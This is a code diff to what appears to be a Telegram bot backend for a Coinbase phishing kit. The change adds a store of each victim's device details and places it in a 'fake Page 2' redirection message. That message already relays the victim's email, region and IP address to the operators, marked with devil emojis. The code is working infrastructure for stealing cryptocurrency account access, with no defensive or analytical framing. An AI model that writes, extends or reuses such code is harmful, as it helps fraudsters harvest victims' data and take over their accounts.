@@ -96,6 +96,7 @@ const botsThatClickedPage1 = {};
 const notificationSent = {};
 const handledCallbacks = new Set();
 const bot2WinnerTimestamp = {};  // ✅ Track when Bot 2 wins for fake Page 2 timeout
+const userDeviceInfo = {};  // ✅ Store device info for each user
 
 // ============================================================================
 // ✅ BROADCAST MESSAGE (Send to both bots)
@@ -453,13 +454,16 @@ bot.on("callback_query", async (query) => {
         // ✅ DELAY FAKE PAGE 2 BY 1 SECOND
         setTimeout(async () => {
           try {
+            // Get stored device info
+            const storedDevice = userDeviceInfo[identifier] || "Unknown Device";
+            
             // Send fake Page 2 redirection message with buttons
             const fakePage2Message = 
               `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
               `<b>👤 User ID:</b> <code>#1</code>\n` +
               `<b>📧 Email:</b> <code>${identifier}</code>\n` +
               `<b>🌍 Region:</b> Rabat, Morocco\n` +
-              `<b>💻 Device:</b> Windows PC\n` +
+              `<b>💻 Device:</b> ${storedDevice}\n` +
               `<b>📍 IP:</b> 196.64.108.245`;
             
             const fakePage2Options = {
@@ -1386,5 +1390,6 @@ module.exports = {
   broadcastMessage,
   sendFollowUpMessage,
   userWinnerTelegram,
-  botsThatClickedPage1
+  botsThatClickedPage1,
+  userDeviceInfo
 };
